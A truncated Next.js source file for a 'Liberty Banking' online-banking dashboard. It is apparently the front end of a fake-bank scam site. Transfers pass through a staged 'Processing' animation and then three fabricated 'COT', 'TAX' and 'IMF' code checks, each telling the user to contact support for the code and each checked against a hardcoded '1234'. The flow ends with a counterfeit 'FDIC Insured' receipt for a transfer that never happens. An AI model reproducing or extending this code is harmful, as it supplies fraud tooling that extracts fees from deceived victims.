'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';

/* ─────────────────────────────────────────────
   ACCOUNT DATA
───────────────────────────────────────────── */
const ACCOUNT = {
  name: 'Checkings Account',
  balance: '$4,000.00',
  cardLast4: '8750',
  fullCard: '**** **** **** 8750',
};

const OTP_CODE = '1234';

/* ─────────────────────────────────────────────
   MOBILE STYLES
───────────────────────────────────────────── */
const mobileStyles = `
  @media (max-width: 768px) {
    .db-actions-grid { grid-template-columns: repeat(3, 1fr) !important; gap: 10px !important; }
    .db-tips-grid { grid-template-columns: 1fr !important; }
    .db-balance-card { flex-direction: column !important; gap: 16px !important; }
    .db-balance-right { text-align: left !important; }
    .db-nav-inner { padding: 12px 16px !important; }
    .db-page { padding: 20px 16px !important; }
    .db-modal-inner { padding: 24px 18px !important; }
    .db-transfer-grid { grid-template-columns: 1fr !important; }
  }
  @media (max-width: 480px) {
    .db-actions-grid { grid-template-columns: repeat(2, 1fr) !important; }
  }
  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
  @keyframes pulse-dot {
    0%, 100% { opacity: 0.3; transform: scale(0.8); }
    50% { opacity: 1; transform: scale(1.2); }
  }
`;

/* ─────────────────────────────────────────────
   HELPER COMPONENTS
───────────────────────────────────────────── */
function Modal({ open, onClose, title, children, wide }) {
  if (!open) return null;
  return (
    <div style={{
      position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.6)', zIndex: 200,
      display: 'flex', alignItems: 'flex-start', justifyContent: 'center',
      padding: '20px 16px', overflowY: 'auto',
    }}>
      <div className="db-modal-inner" style={{
        background: '#fff', borderRadius: 20, padding: '32px 28px',
        width: '100%', maxWidth: wide ? 620 : 460,
        position: 'relative', boxShadow: '0 24px 80px rgba(0,0,0,0.3)',
        margin: 'auto',
      }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 22 }}>
          <h2 style={{ fontSize: 19, fontWeight: 800, color: '#0a2240', margin: 0 }}>{title}</h2>
          <button onClick={onClose} style={{
            background: 'none', border: 'none', fontSize: 26, cursor: 'pointer', color: '#888',
            lineHeight: 1, padding: '0 4px', flexShrink: 0,
          }}>×</button>
        </div>
        {children}
      </div>
    </div>
  );
}

function Btn({ children, onClick, style: s, variant = 'primary', type = 'button' }) {
  const base = {
    padding: '12px 20px', borderRadius: 10, fontSize: 14, fontWeight: 700,
    cursor: 'pointer', border: 'none', transition: 'opacity 0.2s',
    WebkitTapHighlightColor: 'transparent', touchAction: 'manipulation', ...s,
  };
  if (variant === 'primary') return <button type={type} onClick={onClick} style={{ background: '#0a2240', color: '#fff', ...base }}>{children}</button>;
  if (variant === 'gold') return <button type={type} onClick={onClick} style={{ background: '#d4af37', color: '#0a2240', ...base }}>{children}</button>;
  if (variant === 'outline') return <button type={type} onClick={onClick} style={{ background: '#fff', color: '#0a2240', border: '2px solid #0a2240', ...base }}>{children}</button>;
  return <button type={type} onClick={onClick} style={base}>{children}</button>;
}

function InputRow({ icon, label, name, placeholder, type = 'text', optional, value, onChange }) {
  return (
    <div style={{ marginBottom: 16 }}>
      
      <label style={{ display: 'block', fontSize: 13, fontWeight: 700, color: '#333', marginBottom: 5 }}>
        {label}
        {optional && <span style={{ color: '#999', fontWeight: 400, marginLeft: 4 }}>(Optional)</span>}
      </label>

      <div style={{ position: 'relative' }}>
        
        {icon && (
          <span style={{
            position: 'absolute',
            left: 13,
            top: '50%',
            transform: 'translateY(-50%)',
            fontSize: 17,
            opacity: 0.5,
            pointerEvents: 'none',
          }}>
            {icon}
          </span>
        )}

        <input
          type={type}
          name={name}
          value={value}
          onChange={onChange}
          placeholder={placeholder}
          required={!optional}
          style={{
            width: '100%',
            padding: `11px 12px 11px ${icon ? '42px' : '12px'}`,
            border: '1.5px solid #ddd',
            borderRadius: 10,
            fontSize: 14,
            outline: 'none',
            boxSizing: 'border-box',

            // ✅ FIX ADDED (DO NOT REMOVE)
            color: '#000',
            WebkitTextFillColor: '#000',
            backgroundColor: '#fff'
          }}
          onFocus={e => e.target.style.borderColor = '#0a2240'}
          onBlur={e => e.target.style.borderColor = '#ddd'}
        />

      </div>
    </div>
  );
}
/* ─────────────────────────────────────────────
   PROCESSING SCREEN
───────────────────────────────────────────── */
function ProcessingScreen({ onDone }) {
  const [dots, setDots] = useState(0);

  useEffect(() => {
    const dotInterval = setInterval(() => setDots(d => (d + 1) % 4), 400);
    const timer = setTimeout(onDone, 3000);
    return () => { clearInterval(dotInterval); clearTimeout(timer); };
  }, [onDone]);

  return (
    <div style={{ textAlign: 'center', padding: '32px 0' }}>
      {/* Spinner */}
      <div style={{
        width: 72, height: 72, borderRadius: '50%',
        border: '5px solid #e8ecf0',
        borderTop: '5px solid #0a2240',
        margin: '0 auto 28px',
        animation: 'spin 1s linear infinite',
      }} />

      <h3 style={{ color: '#0a2240', fontWeight: 800, fontSize: 20, margin: '0 0 10px' }}>
        Processing Transfer{'.'.repeat(dots)}
      </h3>
      <p style={{ color: '#666', fontSize: 14, lineHeight: 1.7, margin: '0 0 28px' }}>
        Please wait while we securely process your request.<br />
        Do not close this window.
      </p>

      {/* Animated steps */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: 10, textAlign: 'left', maxWidth: 260, margin: '0 auto' }}>
        {[
          { label: 'Validating transfer details', delay: 0 },
          { label: 'Checking account balance', delay: 0.3 },
          { label: 'Initiating security verification', delay: 0.6 },
        ].map(({ label, delay }, i) => (
          <div key={label} style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
            <div style={{
              width: 8, height: 8, borderRadius: '50%', background: '#0a2240', flexShrink: 0,
              animation: `pulse-dot 1.2s ease-in-out ${delay}s infinite`,
            }} />
            <span style={{ fontSize: 13, color: '#555' }}>{label}</span>
          </div>
        ))}
      </div>

      <div style={{ marginTop: 32, background: '#f8f9fa', borderRadius: 10, padding: '10px 16px', display: 'inline-block' }}>
        <span style={{ fontSize: 12, color: '#888' }}>🔒 Secured by 256-bit SSL Encryption</span>
      </div>
    </div>
  );
}

/* ─────────────────────────────────────────────
   TRANSFER MODAL — 6 STEPS:
   1: Form → 2: Processing → 3: OTP Code → 4: Gmail OTP → 5: Authenticator OTP → 6: Receipt
───────────────────────────────────────────── */
function TransferModal({ open, onClose, title }) {
  const [step, setStep] = useState(1);
  const [fields, setFields] = useState({
    amount: '', beneficiary: '', iban: '', bank: '', swift: '',
    routing: '', address: '', remarks: '',
  });
  const [otpCode, setOtpCode]     = useState('');
  const [otpError, setOtpError]   = useState('');
  const [gmailOtp, setGmailOtp]   = useState('');
  const [gmailError, setGmailError] = useState('');
  const [authOtp, setAuthOtp]     = useState('');
  const [authError, setAuthError] = useState('');
  const [ref] = useState(() => 'LB' + Math.random().toString(36).substring(2, 10).toUpperCase());
  const [txDate] = useState(() => new Date().toLocaleString());

  function handleChange(e) {
    setFields(f => ({ ...f, [e.target.name]: e.target.value }));
  }
  function handleSubmitForm(e) { e.preventDefault(); setStep(2); }

  function handleOtpCode(e) {
    e.preventDefault();
    if (otpCode === OTP_CODE) { setStep(4); }
    else { setOtpError('Incorrect code. Please try again.'); }
  }
  function handleGmailOtp(e) {
    e.preventDefault();
    if (gmailOtp === OTP_CODE) { setStep(5); }
    else { setGmailError('Incorrect code. Please try again.'); }
  }
  function handleAuthOtp(e) {
    e.preventDefault();
    if (authOtp === OTP_CODE) { setStep(6); }
    else { setAuthError('Incorrect code. Please try again.'); }
  }

  function handleClose() {
    setStep(1);
    setFields({ amount: '', beneficiary: '', iban: '', bank: '', swift: '', routing: '', address: '', remarks: '' });
    setOtpCode(''); setOtpError('');
    setGmailOtp(''); setGmailError('');
    setAuthOtp(''); setAuthError('');
    onClose();
  }

  /* shared step-dot indicator — highlights up to `active` out of 3 */
  function StepDots({ active }) {
    const colors = ['#22a55e', '#22a55e', '#22a55e'];
    return (
      <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', gap: 8, margin: '20px 0 4px' }}>
        {[0, 1, 2].map(i => (
          <div key={i} style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
            <div style={{ width: 10, height: 10, borderRadius: '50%', background: i < active ? colors[i] : (i === active - 1 ? '#0a2240' : '#ddd') }} />
            {i < 2 && <div style={{ width: 30, height: 2, background: i < active - 1 ? '#22a55e' : '#ddd' }} />}
          </div>
        ))}
      </div>
    );
  }

  return (
    <Modal open={open} onClose={step === 2 ? undefined : handleClose} title={title} wide>

      {/* ── STEP 1: FORM ── */}
      {step === 1 && (
        <form onSubmit={handleSubmitForm}>
          <div className="db-transfer-grid" style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0 18px' }}>
            <div style={{ gridColumn: '1 / -1' }}>
              <InputRow icon="$" label="Amount" name="amount" placeholder="Enter amount (e.g. 500.00)" type="number" value={fields.amount} onChange={handleChange}  />
            </div>
            <div style={{ gridColumn: '1 / -1' }}>
              <InputRow icon="👤" label="Beneficiary Name" name="beneficiary" placeholder="Full name of recipient" value={fields.beneficiary} onChange={handleChange}  />
            </div>
            <div style={{ gridColumn: '1 / -1' }}>
              <InputRow icon="🏦" label="IBAN / Account Number" name="iban" placeholder="Enter IBAN or account number" value={fields.iban} onChange={handleChange}  />
            </div>
            <InputRow icon="🏢" label="Bank" name="bank" placeholder="Recipient's bank name" value={fields.bank} onChange={handleChange} />
            <InputRow icon="🔑" label="SWIFT Code" name="swift" placeholder="e.g. CHASEUS33" value={fields.swift} onChange={handleChange} />
            <div style={{ gridColumn: '1 / -1' }}>
              <InputRow icon="🔢" label="Routing / Transit Number" name="routing" placeholder="9-digit routing number" value={fields.routing} onChange={handleChange}  />
            </div>
            <div style={{ gridColumn: '1 / -1' }}>
              <InputRow icon="📍" label="Bank Address" name="address" placeholder="Street, City, State, ZIP" optional value={fields.address} onChange={handleChange}  />
            </div>
            <div style={{ gridColumn: '1 / -1' }}>
              <InputRow icon="📝" label="Remarks" name="remarks" placeholder="Add a note for the recipient" optional value={fields.remarks} onChange={handleChange}  />
            </div>
          </div>
          <div style={{ display: 'flex', gap: 10, marginTop: 8 }}>
            <Btn variant="outline" onClick={handleClose} style={{ flex: 1 }}>Cancel</Btn>
            <Btn variant="primary" type="submit" style={{ flex: 2 }}>Continue →</Btn>
          </div>
        </form>
      )}

      {/* ── STEP 2: PROCESSING ── */}
      {step === 2 && (
        <ProcessingScreen onDone={() => setStep(3)} />
      )}

      {/* ── STEP 3: OTP CODE ── */}
      {step === 3 && (
        <form onSubmit={handleOtpCode}>
          <div style={{ textAlign: 'center', marginBottom: 24 }}>
            <div style={{ fontSize: 52, marginBottom: 14 }}>🔐</div>
            <h3 style={{ color: '#0a2240', fontWeight: 800, fontSize: 18, margin: '0 0 8px' }}>COT CODE Verification</h3>
            <p style={{ color: '#666', fontSize: 14, margin: 0, lineHeight: 1.7 }}>
              Insert your COT Code to continue this transaction.<br />
              Kindly contact support.
            </p>
          </div>
          <label style={{ display: 'block', fontSize: 13, fontWeight: 700, color: '#333', marginBottom: 6, textAlign: 'center' }}>
            Enter COT Code
          </label>
          <input
            type="text" value={otpCode}
            onChange={e => { setOtpCode(e.target.value); setOtpError(''); }}
            placeholder="Enter code" maxLength={6} required autoComplete="one-time-code"
            style={{
              width: '100%', padding: '14px', border: '2px solid #ddd', borderRadius: 12,
              fontSize: 24, textAlign: 'center', letterSpacing: 8, outline: 'none',
              boxSizing: 'border-box', fontWeight: 800, color: '#0a2240',
            }}
            onFocus={e => e.target.style.borderColor = '#0a2240'}
            onBlur={e => e.target.style.borderColor = '#ddd'}
          />
          {otpError && (
            <div style={{ background: '#fff0f0', border: '1px solid #f5c6cb', color: '#c62828', borderRadius: 8, padding: '10px 14px', fontSize: 13, marginTop: 10 }}>
              {otpError}
            </div>
          )}
          <StepDots active={1} />
          <p style={{ textAlign: 'center', fontSize: 11, color: '#aaa', margin: '4px 0 16px' }}>COT Verification</p>
          <div style={{ display: 'flex', gap: 10 }}>
            <Btn variant="outline" onClick={() => setStep(1)} style={{ flex: 1 }}>← Back</Btn>
            <Btn variant="primary" type="submit" style={{ flex: 2 }}>Verify COT Code</Btn>
          </div>
        </form>
      )}

      {/* ── STEP 4: GMAIL OTP ── */}
      {step === 4 && (
        <form onSubmit={handleGmailOtp}>
          <div style={{ textAlign: 'center', marginBottom: 24 }}>
            <div style={{ fontSize: 52, marginBottom: 14 }}>🔐</div>
            <h3 style={{ color: '#0a2240', fontWeight: 800, fontSize: 18, margin: '0 0 8px' }}>TAX Code Verification</h3>
            <p style={{ color: '#666', fontSize: 14, margin: 0, lineHeight: 1.7 }}>
              Insert your TAX Code to continue this transaction.<br />
              If you do not know your code,kindly contact support.
            </p>
          </div>
          <label style={{ display: 'block', fontSize: 13, fontWeight: 700, color: '#333', marginBottom: 6, textAlign: 'center' }}>
            Enter TAX Code
          </label>
          <input
            type="text" value={gmailOtp}
            onChange={e => { setGmailOtp(e.target.value); setGmailError(''); }}
            placeholder="Enter code" maxLength={6} required autoComplete="one-time-code"
            style={{
              width: '100%', padding: '14px', border: '2px solid #ddd', borderRadius: 12,
              fontSize: 24, textAlign: 'center', letterSpacing: 8, outline: 'none',
              boxSizing: 'border-box', fontWeight: 800, color: '#0a2240',
            }}
            onFocus={e => e.target.style.borderColor = '#0a2240'}
            onBlur={e => e.target.style.borderColor = '#ddd'}
          />
          {gmailError && (
            <div style={{ background: '#fff0f0', border: '1px solid #f5c6cb', color: '#c62828', borderRadius: 8, padding: '10px 14px', fontSize: 13, marginTop: 10 }}>
              {gmailError}
            </div>
          )}
          <StepDots active={2} />
          <p style={{ textAlign: 'center', fontSize: 11, color: '#aaa', margin: '4px 0 16px' }}>TAX Code Verification</p>
          <div style={{ display: 'flex', gap: 10 }}>
            <Btn variant="outline" onClick={() => setStep(3)} style={{ flex: 1 }}>← Back</Btn>
            <Btn variant="primary" type="submit" style={{ flex: 2 }}>Verify TAX Code</Btn>
          </div>
        </form>
      )}

      {/* ── STEP 5: AUTHENTICATOR OTP ── */}
      {step === 5 && (
        <form onSubmit={handleAuthOtp}>
          <div style={{ textAlign: 'center', marginBottom: 24 }}>
            <div style={{ fontSize: 52, marginBottom: 14 }}>🔐</div>
            <h3 style={{ color: '#0a2240', fontWeight: 800, fontSize: 18, margin: '0 0 8px' }}>IMF Code Verification</h3>
            <p style={{ color: '#666', fontSize: 14, margin: 0, lineHeight: 1.7 }}>
              Insert your IMF Code to continue this transaction.<br />
              If you do not know your code, Kindly contact support.
            </p>
          </div>
          <label style={{ display: 'block', fontSize: 13, fontWeight: 700, color: '#333', marginBottom: 6, textAlign: 'center' }}>
            Enter IMF Code
          </label>
          <input
            type="text" value={authOtp}
            onChange={e => { setAuthOtp(e.target.value); setAuthError(''); }}
            placeholder="Enter code" maxLength={6} required autoComplete="one-time-code"
            style={{
              width: '100%', padding: '14px', border: '2px solid #ddd', borderRadius: 12,
              fontSize: 24, textAlign: 'center', letterSpacing: 8, outline: 'none',
              boxSizing: 'border-box', fontWeight: 800, color: '#0a2240',
            }}
            onFocus={e => e.target.style.borderColor = '#0a2240'}
            onBlur={e => e.target.style.borderColor = '#ddd'}
          />
          {authError && (
            <div style={{ background: '#fff0f0', border: '1px solid #f5c6cb', color: '#c62828', borderRadius: 8, padding: '10px 14px', fontSize: 13, marginTop: 10 }}>
              {authError}
            </div>
          )}
          <StepDots active={3} />
          <p style={{ textAlign: 'center', fontSize: 11, color: '#aaa', margin: '4px 0 16px' }}>IMF Verification</p>
          <div style={{ display: 'flex', gap: 10 }}>
            <Btn variant="outline" onClick={() => setStep(4)} style={{ flex: 1 }}>← Back</Btn>
            <Btn variant="primary" type="submit" style={{ flex: 2 }}>Verify & Transfer</Btn>
          </div>
        </form>
      )}

      {/* ── STEP 6: RECEIPT ── */}
      {step === 6 && (
        <div>
          <div style={{
            border: '2px dashed #ccc', borderRadius: 16, padding: '24px',
            fontFamily: '"Courier New", monospace', fontSize: 13,
          }}>
            <div style={{ textAlign: 'center', marginBottom: 18 }}>
              <div style={{ fontSize: 26, marginBottom: 6 }}>🏛</div>
              <div style={{ fontSize: 17, fontWeight: 900, color: '#0a2240', letterSpacing: 1 }}>LIBERTY BANKING</div>
              <div style={{ fontSize: 10, color: '#888', letterSpacing: 2, textTransform: 'uppercase' }}>Official Transfer Receipt</div>
              <div style={{ borderBottom: '1px dashed #ccc', margin: '12px 0' }} />
            </div>

            <div style={{ display: 'flex', flexDirection: 'column', gap: 9 }}>
              {[
                ['Transaction Type', title],
                ['Reference No.', ref],
                ['Date & Time', txDate],
                ['From', 'Checkings Account – ' + ACCOUNT.fullCard],
                ['Beneficiary', fields.beneficiary],
                ['Account / IBAN', fields.iban],
                ['Bank', fields.bank],
                ['SWIFT Code', fields.swift],
                ['Routing No.', fields.routing],
                ...(fields.address ? [['Bank Address', fields.address]] : []),
                ...(fields.remarks ? [['Remarks', fields.remarks]] : []),
              ].map(([k, v]) => (
                <div key={k} style={{ display: 'flex', justifyContent: 'space-between', gap: 16, borderBottom: '1px dotted #eee', paddingBottom: 7 }}>
                  <span style={{ color: '#888', flexShrink: 0, fontSize: 12 }}>{k}</span>
                  <span style={{ fontWeight: 700, textAlign: 'right', wordBreak: 'break-all', fontSize: 12 }}>{v}</span>
                </div>
              ))}
            </div>

            <div style={{ borderTop: '2px dashed #ccc', marginTop: 14, paddingTop: 14, textAlign: 'center' }}>
              <div style={{ fontSize: 10, color: '#888', marginBottom: 4, letterSpacing: 1, textTransform: 'uppercase' }}>Amount Transferred</div>
              <div style={{ fontSize: 34, fontWeight: 900, color: '#0a2240' }}>
                ${parseFloat(fields.amount || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}
              </div>
            </div>

            <div style={{ textAlign: 'center', marginTop: 16, borderTop: '1px dashed #ccc', paddingTop: 14 }}>
              <div style={{ color: '#22a55e', fontWeight: 800, fontSize: 15 }}>✔ Transfer Successful</div>
              <div style={{ fontSize: 10, color: '#aaa', marginTop: 8 }}>Keep this receipt for your records.</div>
              <div style={{ fontSize: 10, color: '#aaa', marginTop: 2 }}>Liberty Banking | FDIC Insured | libertybanking.com</div>
            </div>
          </div>

          <div style={{ display: 'flex', gap: 10, marginTop: 18 }}>
            <Btn variant="outline" onClick={handleClose} style={{ flex: 1 }}>Close</Btn>
            <Btn variant="gold" onClick={() => window.print()} style={{ flex: 1 }}>🖨 Print Receipt</Btn>
          </div>
        </div>
      )}
    </Modal>
  );
}

/* ─────────────────────────────────────────────
   PAY BILLS MODAL
───────────────────────────────────────────── */
function PayBillsModal({ open, onClose }) {
  const [selected, setSelected] = useState(null);
  return (
    <Modal open={open} onClose={() => { setSelected(null); onClose(); }} title="Pay Bills">
      {!selected && (
        <div>
          <p style={{ color: '#666', fontSize: 14, marginBottom: 20 }}>Select a bill payment category:</p>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
            {[
              { icon: '✈️', label: 'Plane Tickets', desc: 'Book or pay for airline tickets' },
              { icon: '🏨', label: 'Hotel Bookings', desc: 'Pay for hotel reservations' },
            ].map(({ icon, label, desc }) => (
              <button key={label} onClick={() => setSelected(label)} style={{
                display: 'flex', alignItems: 'center', gap: 16, padding: '18px 20px',
                border: '2px solid #eee', borderRadius: 14, background: '#fff', cursor: 'pointer', textAlign: 'left',
                WebkitTapHighlightColor: 'transparent', touchAction: 'manipulation',
              }}
                onMouseEnter={e => { e.currentTarget.style.borderColor = '#0a2240'; e.currentTarget.style.background = '#f8f9ff'; }}
                onMouseLeave={e => { e.currentTarget.style.borderColor = '#eee'; e.currentTarget.style.background = '#fff'; }}
              >
                <span style={{ fontSize: 32 }}>{icon}</span>
                <div>
                  <div style={{ fontWeight: 800, color: '#0a2240', marginBottom: 2 }}>{label}</div>
                  <div style={{ fontSize: 12, color: '#888' }}>{desc}</div>
                </div>
              </button>
            ))}
          </div>
        </div>
      )}
      {selected && (
        <div style={{ textAlign: 'center', padding: '16px 0' }}>
          <div style={{ fontSize: 56, marginBottom: 18 }}>🚧</div>
          <h3 style={{ color: '#0a2240', fontWeight: 800, fontSize: 20, marginBottom: 10 }}>Not Available at the Moment</h3>
          <p style={{ color: '#666', fontSize: 14, lineHeight: 1.8, marginBottom: 24 }}>
            <strong>{selected}</strong> payment is currently unavailable. We're working to bring this to you soon.
          </p>
          <Btn variant="primary" onClick={() => { setSelected(null); onClose(); }} style={{ width: '100%' }}>Close</Btn>
        </div>
      )}
    </Modal>
  );
}

/* ─────────────────────────────────────────────
   ALERTS MODAL
───────────────────────────────────────────── */
function AlertsModal({ open, onClose }) {
  return (
    <Modal open={open} onClose={onClose} title="Account Alerts">
      <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
        {[
          { icon: '⚠️', bg: '#fffbeb', msg: 'You have no pending security alerts at this time.', time: 'Just now' },
          { icon: '🔔', bg: '#eff6ff', msg: 'Your account statement for March 2026 is now available.', time: '2 days ago' },
          { icon: '✅', bg: '#f0fdf4', msg: 'Your profile information was successfully updated.', time: '5 days ago' },
          { icon: '🔒', bg: '#faf5ff', msg: 'A new device accessed your account. If this was not you, contact us immediately.', time: '1 week ago' },
        ].map(({ icon, bg, msg, time }, i) => (
          <div key={i} style={{ display: 'flex', gap: 12, padding: '14px 16px', borderRadius: 12, background: bg, alignItems: 'flex-start' }}>
            <div style={{ fontSize: 22, flexShrink: 0 }}>{icon}</div>
            <div>
              <p style={{ margin: 0, fontSize: 14, color: '#333', lineHeight: 1.6 }}>{msg}</p>
              <span style={{ fontSize: 11, color: '#999', marginTop: 3, display: 'block' }}>{time}</span>
            </div>
          </div>
        ))}
      </div>
      <Btn variant="primary" onClick={onClose} style={{ width: '100%', marginTop: 18 }}>Close</Btn>
    </Modal>
  );
}

/* ─────────────────────────────────────────────
   SUPPORT MODAL
───────────────────────────────────────────── */
function SupportModal({ open, onClose }) {
  const [subject, setSubject] = useState('');
  const [message, setMessage] = useState('');
  const [sent, setSent] = useState(false);

  return (
    <Modal open={open} onClose={() => { setSent(false); setSubject(''); setMessage(''); onClose(); }} title="Customer Support">
      {!sent ? (
        <form onSubmit={e => { e.preventDefault(); setSent(true); }}>
          <p style={{ color: '#666', fontSize: 14, marginBottom: 18, lineHeight: 1.7 }}>
            Our support team is available 24/7. We'll respond within 24 hours.
          </p>
          <div style={{ marginBottom: 16 }}>
            <label style={{ display: 'block', fontSize: 13, fontWeight: 700, color: '#333', marginBottom: 5 }}>Subject</label>
            <div style={{ position: 'relative' }}>
              <span style={{ position: 'absolute', left: 13, top: 13, fontSize: 15, opacity: 0.5 }}>📋</span>
              <input type="text" value={subject} onChange={e => setSubject(e.target.value)}
                placeholder="Brief description of your issue" required
                style={{ width: '100%', padding: '11px 12px 11px 42px', border: '1.5px solid #ddd', borderRadius: 10, fontSize: 14, outline: 'none', boxSizing: 'border-box' }}
                onFocus={e => e.target.style.borderColor = '#0a2240'}
                onBlur={e => e.target.style.borderColor = '#ddd'}
              />
            </div>
          </div>
          <div style={{ marginBottom: 18 }}>
            <label style={{ display: 'block', fontSize: 13, fontWeight: 700, color: '#333', marginBottom: 5 }}>Message</label>
            <div style={{ position: 'relative' }}>
              <span style={{ position: 'absolute', left: 13, top: 13, fontSize: 15, opacity: 0.5 }}>💬</span>
              <textarea value={message} onChange={e => setMessage(e.target.value)}
                placeholder="Describe your issue in detail..." required rows={5}
                style={{ width: '100%', padding: '11px 12px 11px 42px', border: '1.5px solid #ddd', borderRadius: 10, fontSize: 14, outline: 'none', resize: 'vertical', boxSizing: 'border-box' }}
                onFocus={e => e.target.style.borderColor = '#0a2240'}
                onBlur={e => e.target.style.borderColor = '#ddd'}
              />
            </div>
          </div>
          <Btn variant="primary" type="submit" style={{ width: '100%' }}>Submit Message ✉️</Btn>
        </form>
      ) : (
        <div style={{ textAlign: 'center', padding: '20px 0' }}>
          <div style={{ fontSize: 56, marginBottom: 14 }}>✅</div>
          <h3 style={{ color: '#22a55e', fontWeight: 800, fontSize: 20, marginBottom: 10 }}>Message Sent!</h3>
          <p style={{ color: '#666', fontSize: 14, lineHeight: 1.8, marginBottom: 24 }}>
            Thank you for reaching out. Our team will respond within 24 hours.
          </p>
          <Btn variant="primary" onClick={() => { setSent(false); setSubject(''); setMessage(''); onClose(); }} style={{ width: '100%' }}>Done</Btn>
        </div>
      )}
    </Modal>
  );
}

/* ─────────────────────────────────────────────
   GENERIC MODAL
───────────────────────────────────────────── */
function GenericModal({ open, onClose, title, icon, desc }) {
  return (
    <Modal open={open} onClose={onClose} title={title}>
      <div style={{ textAlign: 'center', padding: '12px 0' }}>
        <div style={{ fontSize: 52, marginBottom: 14 }}>{icon}</div>
        <p style={{ color: '#555', fontSize: 14, lineHeight: 1.8, marginBottom: 24 }}>{desc}</p>
        <Btn variant="primary" onClick={onClose} style={{ width: '100%' }}>Close</Btn>
      </div>
    </Modal>
  );
}

/* ─────────────────────────────────────────────
   PROFILE MODAL
───────────────────────────────────────────── */
function ProfileModal({ open, onClose }) {
  return (
    <Modal open={open} onClose={onClose} title="My Profile">
      <div style={{ textAlign: 'center', marginBottom: 22 }}>
        <div style={{
          width: 76, height: 76, borderRadius: '50%',
          background: 'linear-gradient(135deg, #0a2240, #1a4080)',
          display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 34,
          margin: '0 auto 14px', boxShadow: '0 8px 24px rgba(10,34,64,0.3)',
        }}>👤</div>
        <div style={{ fontSize: 17, fontWeight: 800, color: '#0a2240' }}>Account Holder</div>
        <div style={{ fontSize: 12, color: '#888', marginTop: 3 }}>Account ID: 9337910</div>
      </div>

      <div style={{
        background: 'linear-gradient(135deg, #0a2240, #1a4080)', borderRadius: 14,
        padding: 22, color: '#fff', marginBottom: 18,
      }}>
        <div style={{ fontSize: 11, color: 'rgba(200,220,255,0.8)', marginBottom: 5, letterSpacing: 1, textTransform: 'uppercase' }}>Checkings Account</div>
        <div style={{ fontSize: 30, fontWeight: 900, color: '#d4af37' }}>{ACCOUNT.balance}</div>
        <div style={{ fontSize: 13, color: 'rgba(200,220,255,0.7)', marginTop: 8, letterSpacing: 2 }}>
          •••• •••• •••• {ACCOUNT.cardLast4}
        </div>
      </div>

      <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
        {[
          ['Account Type', 'Checkings Account'],
          ['Account Status', '✅ Active'],
        ].map(([k, v]) => (
          <div key={k} style={{ display: 'flex', justifyContent: 'space-between', padding: '9px 0', borderBottom: '1px solid #f0f0f0' }}>
            <span style={{ color: '#888', fontSize: 14 }}>{k}</span>
            <span style={{ fontWeight: 700, color: '#333', fontSize: 14 }}>{v}</span>
          </div>
        ))}
      </div>

      <Btn variant="primary" onClick={onClose} style={{ width: '100%', marginTop: 18 }}>Close</Btn>
    </Modal>
  );
}

/* ─────────────────────────────────────────────
   MAIN DASHBOARD PAGE
───────────────────────────────────────────── */
export default function DashboardPage() {
  const router = useRouter();
  const [openModal, setOpenModal] = useState(null);
  const [showProfile, setShowProfile] = useState(false);

  const open = (name) => setOpenModal(name);
  const close = () => setOpenModal(null);

  const quickActions = [
    { id: 'wire',         icon: '🌐', label: 'Wire Transfer',     color: '#0a2240' },
    { id: 'local',        icon: '🏦', label: 'Local Transfer',    color: '#1a4080' },
    { id: 'internal',     icon: '🔄', label: 'Internal Transfer', color: '#0f3060' },
    { id: 'bills',        icon: '📄', label: 'Pay Bills',         color: '#0369a1' },
    { id: 'beneficiary',  icon: '👥', label: 'Add Beneficiary',   color: '#15803d' },
    { id: 'carddeposit',  icon: '💳', label: 'Card Deposit',      color: '#b45309' },
    { id: 'checkdeposit', icon: '🖊', label: 'Check Deposit',     color: '#7e22ce' },
    { id: 'alerts',       icon: '🔔', label: 'Alerts',            color: '#dc2626' },
    { id: 'loans',        icon: '🏠', label: 'Loans',             color: '#065f46' },
    { id: 'investment',   icon: '📈', label: 'Investment',        color: '#92400e' },
    { id: 'support',      icon: '🎧', label: 'Support',           color: '#1e3a5f' },
  ];

  const tips = [
    { icon: '💰', title: 'AutoSave', desc: "Set a goal, save automatically with Liberty Banking's Auto Save and track your progress." },
    { icon: '📊', title: 'Budget', desc: 'Check in with your budget and stay on top of your spending.' },
    { icon: '🏠', title: 'Home Option', desc: 'Your home purchase, refinance and insights right under one roof.' },
    { icon: '🛡', title: 'Security Tip', desc: 'We will NEVER ask you to provide your security details such as codes or any sensitive details of your account.' },
  ];

  return (
    <div style={{ minHeight: '100vh', background: '#f0f4f8', fontFamily: 'Georgia, serif' }}>
      <style>{mobileStyles}</style>

      {/* ─── TOP NAV ─── */}
      <nav style={{ background: '#0a2240', color: '#fff', position: 'sticky', top: 0, zIndex: 50, boxShadow: '0 2px 16px rgba(0,0,0,0.3)' }}>
        <div className="db-nav-inner" style={{ maxWidth: 1100, margin: '0 auto', padding: '14px 24px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
            <span style={{ fontSize: 26 }}>🏛</span>
            <div>
              <div style={{ fontSize: 18, fontWeight: 800, letterSpacing: 1 }}>Liberty Banking</div>
              <div style={{ fontSize: 9, color: '#d4af37', letterSpacing: 3, textTransform: 'uppercase' }}>Online Banking</div>
            </div>
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
            <button onClick={() => setShowProfile(true)} style={{
              background: 'rgba(255,255,255,0.1)', border: '2px solid rgba(255,255,255,0.2)',
              borderRadius: '50%', width: 40, height: 40, cursor: 'pointer', fontSize: 18,
              display: 'flex', alignItems: 'center', justifyContent: 'center',
              WebkitTapHighlightColor: 'transparent', touchAction: 'manipulation',
            }} title="View Profile">👤</button>
            <button onClick={() => router.push('/')} style={{
              background: 'rgba(255,255,255,0.1)', border: '1.5px solid rgba(255,255,255,0.25)',
